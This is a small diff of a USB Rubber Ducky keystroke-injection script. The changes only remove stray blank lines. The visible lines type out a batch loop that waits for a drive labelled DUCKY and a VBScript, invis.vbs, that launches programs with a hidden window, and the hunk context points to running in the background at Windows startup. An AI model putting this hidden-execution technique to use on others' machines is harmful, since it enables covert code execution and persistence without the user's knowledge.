@@ -30,7 +30,6 @@ REM DuckyWait.bat
 STRING :while1
 ENTER
 STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') 
-
 do set myd=%%d
 ENTER
 STRING if Exist %myd% (
@@ -61,7 +60,6 @@ background-when-windows-boots-up
 STRING copy con invis.vbs
 ENTER
 STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, 
-
 False
 ENTER
 CONTROL Z
